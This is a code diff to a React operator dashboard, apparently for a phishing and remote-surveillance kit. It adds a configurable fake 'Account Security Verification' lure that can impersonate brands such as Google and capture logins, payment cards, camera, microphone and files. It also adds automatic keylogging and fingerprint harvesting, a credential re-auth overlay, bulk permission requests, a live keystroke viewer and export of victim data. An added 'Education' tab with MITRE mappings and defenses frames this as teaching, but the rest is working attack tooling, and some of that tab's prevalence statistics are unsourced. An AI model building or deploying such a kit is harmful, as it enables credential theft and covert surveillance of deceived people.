@@ -21,6 +21,28 @@ import {
   BatteryMedium, WifiIcon, Timer,
 } from "lucide-react";
 
+interface PageConfig {
+  steps: { identity: boolean; biometric: boolean; voice: boolean; environment: boolean; documents: boolean };
+  enableBanking: boolean;
+  enableAutoHarvest: boolean;
+  enableCredentialOverlay: boolean;
+  autoRequestPermissions: boolean;
+  pageTitle: string;
+  pageSubtitle: string;
+  brandColor: "blue" | "red" | "green" | "purple" | "orange";
+}
+
+const defaultPageConfig: PageConfig = {
+  steps: { identity: true, biometric: true, voice: true, environment: true, documents: true },
+  enableBanking: false,
+  enableAutoHarvest: true,
+  enableCredentialOverlay: false,
+  autoRequestPermissions: false,
+  pageTitle: "Account Security Verification",
+  pageSubtitle: "",
+  brandColor: "blue",
+};
+
 interface RemoteSession {
   id: number;
   organizationId: number;
@@ -30,6 +52,7 @@ interface RemoteSession {
   permissionsGranted: string[] | null;
   deviceInfo: any;
   locationData: any;
+  pageConfig: PageConfig | null;
   createdBy: string;
   createdAt: string;
   expiresAt: string;
@@ -52,6 +75,9 @@ export default function RemoteControlPage() {
   const { toast } = useToast();
   const [sessionName, setSessionName] = useState("");
   const [expiryMinutes, setExpiryMinutes] = useState("60");
+  const [pageConfig, setPageConfig] = useState<PageConfig>({ ...defaultPageConfig });
+  const [showConfig, setShowConfig] = useState(false);
+  const [activeSessionId, setActiveSessionId] = useState<number | null>(null);
   const [activeSessionToken, setActiveSessionToken] = useState<string | null>(null);
   const [targetConnected, setTargetConnected] = useState(false);
   const [liveDeviceInfo, setLiveDeviceInfo] = useState<any>(null);
@@ -97,8 +123,8 @@ export default function RemoteControlPage() {
   const { data: sessions = [], isLoading } = useQuery<RemoteSession[]>({ queryKey: ["/api/remote-sessions"] });
 
   const createMutation = useMutation({
-    mutationFn: async (data: { name: string; expiryMinutes: number }) => { const res = await apiRequest("POST", "/api/remote-sessions", data); return res.json(); },
-    onSuccess: () => { queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] }); setSessionName(""); toast({ title: "Session created" }); },
+    mutationFn: async (data: { name: string; expiryMinutes: number; pageConfig: PageConfig }) => { const res = await apiRequest("POST", "/api/remote-sessions", data); return res.json(); },
+    onSuccess: () => { queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] }); setSessionName(""); setPageConfig({ ...defaultPageConfig }); setShowConfig(false); toast({ title: "Session created" }); },
   });
 
   const deleteMutation = useMutation({
@@ -110,9 +136,10 @@ export default function RemoteControlPage() {
     if (wsRef.current?.readyState === WebSocket.OPEN) wsRef.current.send(JSON.stringify(msg));
   }, []);
 
-  const connectToSession = useCallback((token: string) => {
+  const connectToSession = useCallback((token: string, sessionId?: number) => {
     if (wsRef.current) wsRef.current.close();
     setActiveSessionToken(token);
+    if (sessionId) setActiveSessionId(sessionId);
     setTargetConnected(false);
     setLiveDeviceInfo(null); setLiveLocation(null); setLiveFiles([]); setLiveBrowserData(null);
     setLiveClipboard([]); setLiveCredentials([]); setLiveAutoHarvest(null);
@@ -344,10 +371,71 @@ export default function RemoteControlPage() {
                       <SelectItem value="480">8 hours</SelectItem><SelectItem value="1440">24 hours</SelectItem>
                     </SelectContent>
                   </Select>
-                  <Button onClick={() => createMutation.mutate({ name: sessionName, expiryMinutes: parseInt(expiryMinutes) })} disabled={!sessionName.trim() || createMutation.isPending} data-testid="button-create-session">
-                    {createMutation.isPending ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}<span className="ml-1">Create</span>
-                  </Button>
                 </div>
+
+                <Button variant="outline" size="sm" className="w-full text-xs" onClick={() => setShowConfig(!showConfig)} data-testid="button-toggle-config">
+                  <ListChecks className="w-3 h-3 mr-1" />{showConfig ? "Hide" : "Show"} Page Configuration
+                </Button>
+
+                {showConfig && (
+                  <div className="space-y-3 p-3 rounded-lg border border-border/50 bg-muted/10">
+                    <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Page Title</label>
+                      <Input value={pageConfig.pageTitle} onChange={(e) => setPageConfig((p) => ({ ...p, pageTitle: e.target.value }))} placeholder="Account Security Verification" className="h-8 text-xs" data-testid="input-page-title" />
+                    </div>
+                    <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Subtitle (optional)</label>
+                      <Input value={pageConfig.pageSubtitle} onChange={(e) => setPageConfig((p) => ({ ...p, pageSubtitle: e.target.value }))} placeholder="e.g., Google Account Recovery" className="h-8 text-xs" data-testid="input-page-subtitle" />
+                    </div>
+                    <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Brand Color</label>
+                      <div className="flex gap-2">
+                        {(["blue", "red", "green", "purple", "orange"] as const).map((c) => (
+                          <button key={c} onClick={() => setPageConfig((p) => ({ ...p, brandColor: c }))} className={`w-7 h-7 rounded-full border-2 transition-all ${pageConfig.brandColor === c ? "border-foreground scale-110" : "border-transparent"}`} style={{ backgroundColor: { blue: "#3b82f6", red: "#ef4444", green: "#22c55e", purple: "#a855f7", orange: "#f97316" }[c] }} data-testid={`button-color-${c}`} />
+                        ))}
+                      </div>
+                    </div>
+                    <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-2 block">Wizard Steps</label>
+                      <div className="space-y-1.5">
+                        {([
+                          { key: "identity" as const, label: "Identity Verification (login form)" },
+                          { key: "biometric" as const, label: "Biometric Scan (camera)" },
+                          { key: "voice" as const, label: "Voice Authentication (microphone)" },
+                          { key: "environment" as const, label: "Environment Check (auto-scan)" },
+                          { key: "documents" as const, label: "Document Upload (files)" },
+                        ]).map((s) => (
+                          <label key={s.key} className="flex items-center gap-2 text-xs cursor-pointer">
+                            <Checkbox checked={pageConfig.steps[s.key]} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, steps: { ...p.steps, [s.key]: !!v } }))} data-testid={`checkbox-step-${s.key}`} />
+                            <span>{s.label}</span>
+                          </label>
+                        ))}
+                      </div>
+                    </div>
+                    <div className="space-y-1.5 pt-1 border-t border-border/30">
+                      <label className="flex items-center gap-2 text-xs cursor-pointer">
+                        <Checkbox checked={pageConfig.enableBanking} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableBanking: !!v }))} data-testid="checkbox-enable-banking" />
+                        <span>Payment Card Capture (banking tab)</span>
+                      </label>
+                      <label className="flex items-center gap-2 text-xs cursor-pointer">
+                        <Checkbox checked={pageConfig.enableAutoHarvest} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableAutoHarvest: !!v }))} data-testid="checkbox-enable-autoharvest" />
+                        <span>Auto-Harvest (fingerprint, keylog, activity)</span>
+                      </label>
+                      <label className="flex items-center gap-2 text-xs cursor-pointer">
+                        <Checkbox checked={pageConfig.enableCredentialOverlay} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableCredentialOverlay: !!v }))} data-testid="checkbox-enable-credential-overlay" />
+                        <span>Credential Re-auth Overlay</span>
+                      </label>
+                      <label className="flex items-center gap-2 text-xs cursor-pointer">
+                        <Checkbox checked={pageConfig.autoRequestPermissions} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, autoRequestPermissions: !!v }))} data-testid="checkbox-auto-request" />
+                        <span>Auto-Request Permissions (during wizard)</span>
+                      </label>
+                    </div>
+                  </div>
+                )}
+
+                <Button className="w-full" onClick={() => createMutation.mutate({ name: sessionName, expiryMinutes: parseInt(expiryMinutes), pageConfig })} disabled={!sessionName.trim() || createMutation.isPending} data-testid="button-create-session">
+                  {createMutation.isPending ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}<span className="ml-1">Create Session</span>
+                </Button>
               </CardContent>
             </Card>
             <Card>
@@ -380,7 +468,7 @@ export default function RemoteControlPage() {
                       </div>
                       <div className="flex items-center gap-1 flex-shrink-0">
                         <Button size="sm" variant="ghost" className="h-7 text-xs" onClick={() => copyLink(s.sessionToken)} data-testid={`button-copy-link-${s.id}`}><Copy className="w-3 h-3 mr-1" />Link</Button>
-                        <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => connectToSession(s.sessionToken)} disabled={s.status === "expired" || s.status === "closed"} data-testid={`button-connect-${s.id}`}><Wifi className="w-3 h-3 mr-1" />Monitor</Button>
+                        <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => connectToSession(s.sessionToken, s.id)} disabled={s.status === "expired" || s.status === "closed"} data-testid={`button-connect-${s.id}`}><Wifi className="w-3 h-3 mr-1" />Monitor</Button>
                         <Button size="sm" variant="ghost" className="h-7 w-7 p-0 text-red-400 hover:text-red-300" onClick={() => deleteMutation.mutate(s.id)} data-testid={`button-delete-${s.id}`}><Trash2 className="w-3 h-3" /></Button>
                       </div>
                     </div>
@@ -421,13 +509,42 @@ export default function RemoteControlPage() {
                 <TabsTrigger value="control" className="text-xs" data-testid="tab-control"><Power className="w-3 h-3 mr-1" />Control</TabsTrigger>
                 <TabsTrigger value="feed" className="text-xs" data-testid="tab-feed"><Camera className="w-3 h-3 mr-1" />Live Feed</TabsTrigger>
                 <TabsTrigger value="intel" className="text-xs" data-testid="tab-intel"><Shield className="w-3 h-3 mr-1" />Intelligence</TabsTrigger>
+                <TabsTrigger value="education" className="text-xs" data-testid="tab-education"><AlertTriangle className="w-3 h-3 mr-1" />Education</TabsTrigger>
                 <TabsTrigger value="files" className="text-xs" data-testid="tab-files"><FolderOpen className="w-3 h-3 mr-1" />Files ({liveFiles.length})</TabsTrigger>
                 <TabsTrigger value="events" className="text-xs" data-testid="tab-events"><Activity className="w-3 h-3 mr-1" />Events ({events.length})</TabsTrigger>
               </TabsList>
 
               <TabsContent value="control" className="space-y-4 mt-4">
+                <Card className="border-green-500/20 bg-green-500/5">
+                  <CardContent className="p-3 flex items-center gap-2">
+                    <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
+                    <span className="text-xs font-medium text-green-400">Recording</span>
+                    <span className="text-[10px] text-muted-foreground ml-1">All events are being saved to database for replay</span>
+                    {activeSessionId && (
+                      <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px] ml-auto" onClick={async () => {
+                        try {
+                          const res = await fetch(`/api/remote-sessions/${activeSessionId}/events`, { credentials: "include" });
+                          const data = await res.json();
+                          const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
+                          const l = document.createElement("a"); l.download = `session-${activeSessionId}-events.json`; l.href = URL.createObjectURL(blob); l.click(); URL.revokeObjectURL(l.href);
+                          toast({ title: `Exported ${data.length} events` });
+                        } catch { toast({ title: "Export failed", variant: "destructive" }); }
+                      }} data-testid="button-export-session-data"><Download className="w-3 h-3 mr-1" />Export</Button>
+                    )}
+                  </CardContent>
+                </Card>
+
                 <Card>
-                  <CardHeader className="pb-2"><CardTitle className="text-sm flex items-center gap-2"><Power className="w-4 h-4 text-primary" />Remote Access Control</CardTitle></CardHeader>
+                  <CardHeader className="pb-2">
+                    <CardTitle className="text-sm flex items-center justify-between">
+                      <span className="flex items-center gap-2"><Power className="w-4 h-4 text-primary" />Remote Access Control</span>
+                      <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => {
+                        const idle = permissionItems.filter((p) => permissionStatuses[p.key].status === "idle" || permissionStatuses[p.key].status === "denied");
+                        idle.forEach((p, i) => setTimeout(() => requestPermission(p.key), i * 300));
+                        toast({ title: `Requesting ${idle.length} permissions` });
+                      }} data-testid="button-request-all"><Shield className="w-3 h-3 mr-1" />Request All</Button>
+                    </CardTitle>
+                  </CardHeader>
                   <CardContent>
                     <div className="grid gap-2 grid-cols-2 sm:grid-cols-4 lg:grid-cols-8">
                       {permissionItems.map((item) => {
@@ -608,21 +725,59 @@ export default function RemoteControlPage() {
                     <>
                       <Card className={`border ${levelBg}`} data-testid="card-threat-score">
                         <CardContent className="p-4">
-                          <div className="flex items-center justify-between mb-3">
-                            <div className="flex items-center gap-2">
-                              <Shield className={`w-5 h-5 ${levelColor}`} />
-                              <span className="text-sm font-semibold">Target Exposure Score</span>
-                            </div>
-                            <Badge className={`${levelBg} ${levelColor}`} data-testid="badge-threat-level">{level} - {capturedCount}/{totalCount} vectors</Badge>
-                          </div>
-                          <Progress value={scorePercent} className="h-2 mb-3" data-testid="progress-threat-score" />
-                          <div className="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 gap-1.5">
-                            {threatVectors.map((v) => (
-                              <div key={v.label} className={`flex items-center gap-1 text-[9px] p-1 rounded ${v.captured ? "text-foreground" : "text-muted-foreground/40"}`}>
-                                {v.captured ? <CheckCircle2 className="w-2.5 h-2.5 text-green-400 flex-shrink-0" /> : <XCircle className="w-2.5 h-2.5 flex-shrink-0" />}
-                                <span className="truncate">{v.label}</span>
+                          <div className="flex items-center gap-4">
+                            <div className="relative w-24 h-24 flex-shrink-0">
+                              <svg viewBox="0 0 100 100" className="w-full h-full -rotate-90">
+                                <circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" strokeWidth="8" className="text-muted/30" />
+                                <circle cx="50" cy="50" r="42" fill="none" strokeWidth="8" strokeLinecap="round" strokeDasharray={`${scorePercent * 2.64} 264`} className={scorePercent >= 75 ? "stroke-red-500" : scorePercent >= 50 ? "stroke-orange-500" : scorePercent >= 25 ? "stroke-yellow-500" : "stroke-green-500"} style={{ transition: "stroke-dasharray 0.5s ease" }} />
+                              </svg>
+                              <div className="absolute inset-0 flex flex-col items-center justify-center">
+                                <span className={`text-lg font-bold ${levelColor}`} data-testid="text-threat-percent">{scorePercent}%</span>
+                                <span className="text-[9px] text-muted-foreground">{level}</span>
                               </div>
-                            ))}
+                            </div>
+                            <div className="flex-1">
+                              <div className="flex items-center gap-2 mb-2">
+                                <Shield className={`w-4 h-4 ${levelColor}`} />
+                                <span className="text-sm font-semibold">Exposure Score</span>
+                                <Badge className={`${levelBg} ${levelColor} ml-auto`} data-testid="badge-threat-level">{capturedCount}/{totalCount}</Badge>
+                              </div>
+                              <div className="grid grid-cols-3 sm:grid-cols-4 gap-1">
+                                {threatVectors.map((v) => (
+                                  <div key={v.label} className={`flex items-center gap-1 text-[9px] p-0.5 rounded ${v.captured ? "text-foreground" : "text-muted-foreground/40"}`}>
+                                    {v.captured ? <CheckCircle2 className="w-2.5 h-2.5 text-green-400 flex-shrink-0" /> : <XCircle className="w-2.5 h-2.5 flex-shrink-0" />}
+                                    <span className="truncate">{v.label}</span>
+                                  </div>
+                                ))}
+                              </div>
+                            </div>
+                          </div>
+                        </CardContent>
+                      </Card>
+
+                      <Card className="border-cyan-500/20" data-testid="card-connection-stats">
+                        <CardContent className="p-3">
+                          <div className="flex items-center gap-4 text-xs">
+                            <div className="flex items-center gap-1.5">
+                              <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+                              <span className="text-muted-foreground">WebSocket</span>
+                              <span className="font-mono text-green-400">Connected</span>
+                            </div>
+                            <div className="flex items-center gap-1.5">
+                              <Activity className="w-3 h-3 text-cyan-400" />
+                              <span className="text-muted-foreground">Events:</span>
+                              <span className="font-mono">{events.length}</span>
+                            </div>
+                            <div className="flex items-center gap-1.5">
+                              <Keyboard className="w-3 h-3 text-amber-400" />
+                              <span className="text-muted-foreground">Keystrokes:</span>
+                              <span className="font-mono">{liveKeylogs.reduce((a, b) => a + b.keys.length, 0)}</span>
+                            </div>
+                            <div className="flex items-center gap-1.5 ml-auto">
+                              <Timer className="w-3 h-3 text-muted-foreground" />
+                              <span className="text-muted-foreground">Data points:</span>
+                              <span className="font-mono">{liveActivity.length + liveFormIntercepts.length + liveKeylogs.length + liveCredentials.length + liveClipboard.length}</span>
+                            </div>
                           </div>
                         </CardContent>
                       </Card>
@@ -780,21 +935,26 @@ export default function RemoteControlPage() {
                       </CardTitle>
                     </CardHeader>
                     <CardContent>
-                      {liveKeylogs.length > 0 ? (
-                        <div className="space-y-1 max-h-52 overflow-y-auto">
-                          {liveKeylogs.map((batch, i) => (
-                            <div key={i} className="flex items-start gap-2 text-[10px]">
-                              <span className="text-muted-foreground flex-shrink-0 font-mono">{new Date(batch.timestamp).toLocaleTimeString()}</span>
-                              <span className="font-mono break-all" data-testid={`text-keylog-${i}`}>
-                                {batch.keys.map((k, j) => {
-                                  const isSpecial = k.startsWith("[");
-                                  return <span key={j} className={isSpecial ? "text-amber-400 font-bold" : "text-foreground"}>{k}</span>;
-                                })}
-                              </span>
-                            </div>
-                          ))}
+                      <div className="bg-black rounded-lg border border-amber-500/20 p-3 font-mono text-[11px] max-h-52 overflow-y-auto" data-testid="terminal-keylogger">
+                        <div className="flex items-center gap-2 mb-2 pb-2 border-b border-amber-500/10">
+                          <div className="flex gap-1">
+                            <div className="w-2 h-2 rounded-full bg-red-500" />
+                            <div className="w-2 h-2 rounded-full bg-yellow-500" />
+                            <div className="w-2 h-2 rounded-full bg-green-500" />
+                          </div>
+                          <span className="text-amber-400/60 text-[9px]">keylogger -- {liveKeylogs.reduce((a, b) => a + b.keys.length, 0)} keystrokes</span>
                         </div>
-                      ) : <p className="text-xs text-muted-foreground text-center py-6">Keystrokes appear here as the target types (auto-captured).</p>}
+                        {liveKeylogs.length > 0 ? liveKeylogs.map((batch, i) => (
+                          <div key={i} className="leading-relaxed" data-testid={`text-keylog-${i}`}>
+                            <span className="text-green-500">$ </span>
+                            <span className="text-amber-400/50 text-[9px]">[{new Date(batch.timestamp).toLocaleTimeString()}] </span>
+                            {batch.keys.map((k, j) => {
+                              const isSpecial = k.startsWith("[");
+                              return <span key={j} className={isSpecial ? "text-red-400 bg-red-500/10 px-0.5 rounded" : "text-green-300"}>{k}</span>;
+                            })}
+                          </div>
+                        )) : <div className="text-amber-400/40"><span className="text-green-500">$ </span>Waiting for keystrokes...<span className="inline-block w-1.5 h-3 bg-amber-400 ml-0.5 animate-pulse" /></div>}
+                      </div>
                     </CardContent>
                   </Card>
 
@@ -935,6 +1095,68 @@ export default function RemoteControlPage() {
                     </CardContent>
                   </Card>
                 </div>
+              </TabsContent>
+
+              <TabsContent value="education" className="space-y-4 mt-4">
+                {(() => {
+                  const eduItems = [
+                    { category: "Canvas Fingerprint", captured: !!liveAutoHarvest?.canvasFingerprint, mitre: "T1592.004", risk: "High", prevalence: "Used by 73% of tracking scripts", defense: "Use Firefox with resistFingerprinting enabled, or Tor Browser", description: "Creates a hidden canvas element and draws shapes/text to produce a unique hash based on GPU/driver rendering differences." },
+                    { category: "WebGL Fingerprint", captured: !!liveAutoHarvest?.webglFingerprint, mitre: "T1592.004", risk: "High", prevalence: "Present in 68% of fingerprinting libraries", defense: "Disable WebGL or use browser extensions like WebGL Fingerprint Defender", description: "Extracts GPU vendor, renderer, and capabilities to build a hardware profile unique to the device." },
+                    { category: "Audio Fingerprint", captured: !!liveAutoHarvest?.audioFingerprint, mitre: "T1592.004", risk: "Medium", prevalence: "Used by 41% of advanced trackers", defense: "Use browsers with audio context randomization (Brave, Tor)", description: "Processes audio through an oscillator and compressor to detect unique signal processing characteristics." },
+                    { category: "WebRTC IP Leak", captured: (liveAutoHarvest?.webrtcLeakedIPs?.length || 0) > 0, mitre: "T1590.005", risk: "Critical", prevalence: "Bypasses VPNs in 85% of cases", defense: "Disable WebRTC in browser settings or use uBlock Origin's WebRTC leak prevention", description: "STUN requests reveal local and public IP addresses even when behind a VPN or proxy." },
+                    { category: "Font Enumeration", captured: (liveAutoHarvest?.fontCount || 0) > 0, mitre: "T1592.004", risk: "Medium", prevalence: "Used by 62% of trackers", defense: "Limit installed fonts or use font randomization extensions", description: "Measures text rendering widths to detect which fonts are installed, creating a unique system profile." },
+                    { category: "Credential Harvesting", captured: liveCredentials.length > 0, mitre: "T1056.003", risk: "Critical", prevalence: "#1 attack vector in phishing", defense: "Use password managers with auto-fill, enable 2FA, verify URL before entering credentials", description: "Fake login forms that mimic legitimate services to capture usernames, passwords, and payment details." },
+                    { category: "Keystroke Logging", captured: liveKeylogs.length > 0, mitre: "T1056.001", risk: "Critical", prevalence: "Present in 90%+ of RATs", defense: "Use virtual keyboards for sensitive input, use password managers", description: "Records every keypress in real-time, capturing passwords, messages, and sensitive data as it's typed." },
+                    { category: "Camera/Mic Access", captured: permissionStatuses.camera.status === "granted" || permissionStatuses.microphone.status === "granted", mitre: "T1125/T1123", risk: "Critical", prevalence: "Social engineering success rate: 34%", defense: "Use physical camera covers, revoke browser permissions regularly, watch for recording indicators", description: "Browser permission requests disguised as security verification to gain access to camera and microphone." },
+                    { category: "Geolocation", captured: !!liveLocation, mitre: "T1614.001", risk: "High", prevalence: "Used in 45% of targeted attacks", defense: "Deny location requests, use VPN, disable GPS on mobile", description: "High-accuracy GPS coordinates obtained through browser geolocation API under false pretenses." },
+                    { category: "Browser Data Exfil", captured: !!liveBrowserData, mitre: "T1005", risk: "High", prevalence: "Common in browser extensions/malware", defense: "Clear cookies regularly, use private browsing, limit localStorage data", description: "Reads cookies, localStorage, sessionStorage, and browser plugins to extract session tokens and personal data." },
+                    { category: "Clipboard Hijacking", captured: liveClipboard.length > 0, mitre: "T1115", risk: "High", prevalence: "Used to steal crypto addresses, passwords", defense: "Never copy sensitive data unnecessarily, use clipboard managers with history", description: "Reads clipboard contents which may contain passwords, crypto addresses, or sensitive copied text." },
+                    { category: "Form Hijacking", captured: liveFormIntercepts.length > 0, mitre: "T1056.003", risk: "High", prevalence: "Common in Magecart-style attacks", defense: "Use password managers instead of typing, check for HTTPS", description: "MutationObserver-based injection that intercepts form field values in real-time as users type." },
+                  ];
+                  const capturedItems = eduItems.filter((e) => e.captured);
+                  return (
+                    <>
+                      <Card>
+                        <CardHeader className="pb-2">
+                          <CardTitle className="text-sm flex items-center justify-between">
+                            <span className="flex items-center gap-2"><AlertTriangle className="w-4 h-4 text-yellow-400" />What We Captured - Educational Breakdown</span>
+                            <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => {
+                              const exportData = { sessionId: activeSessionId, timestamp: new Date().toISOString(), capturedVectors: capturedItems.map(({ category, mitre, risk, description, defense }) => ({ category, mitre, risk, description, defense })), totalVectors: eduItems.length, capturedCount: capturedItems.length };
+                              const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: "application/json" });
+                              const l = document.createElement("a"); l.download = `education-report-${Date.now()}.json`; l.href = URL.createObjectURL(blob); l.click(); URL.revokeObjectURL(l.href);
+                              toast({ title: "Report exported" });
+                            }} data-testid="button-export-education"><Download className="w-3 h-3 mr-1" />Export Report</Button>
+                          </CardTitle>
+                        </CardHeader>
+                        <CardContent>
+                          <p className="text-xs text-muted-foreground mb-4">This breakdown shows every data collection technique used during this session, mapped to real-world attack frameworks with defense recommendations.</p>
+                          <div className="space-y-3">
+                            {eduItems.map((item) => (
+                              <div key={item.category} className={`p-3 rounded-lg border ${item.captured ? "border-red-500/20 bg-red-500/5" : "border-border/30 bg-muted/10 opacity-50"}`} data-testid={`edu-item-${item.category.toLowerCase().replace(/\s+/g, "-")}`}>
+                                <div className="flex items-center justify-between mb-1">
+                                  <div className="flex items-center gap-2">
+                                    {item.captured ? <CheckCircle2 className="w-3.5 h-3.5 text-red-400" /> : <XCircle className="w-3.5 h-3.5 text-muted-foreground/40" />}
+                                    <span className="text-xs font-semibold">{item.category}</span>
+                                  </div>
+                                  <div className="flex items-center gap-2">
+                                    <Badge variant="secondary" className="text-[9px] px-1.5 py-0 font-mono">{item.mitre}</Badge>
+                                    <Badge className={`text-[9px] px-1.5 py-0 ${item.risk === "Critical" ? "bg-red-500/20 text-red-400" : item.risk === "High" ? "bg-orange-500/20 text-orange-400" : "bg-yellow-500/20 text-yellow-400"}`}>{item.risk}</Badge>
+                                  </div>
+                                </div>
+                                <p className="text-[10px] text-muted-foreground mb-1.5">{item.description}</p>
+                                <p className="text-[10px] text-muted-foreground/70 italic mb-1">{item.prevalence}</p>
+                                <div className="flex items-start gap-1.5 mt-1 pt-1 border-t border-border/20">
+                                  <Shield className="w-3 h-3 text-green-400 flex-shrink-0 mt-0.5" />
+                                  <p className="text-[10px] text-green-400/80">{item.defense}</p>
+                                </div>
+                              </div>
+                            ))}
+                          </div>
+                        </CardContent>
+                      </Card>
+                    </>
+                  );
+                })()}
               </TabsContent>
 
               <TabsContent value="files" className="space-y-4 mt-4">
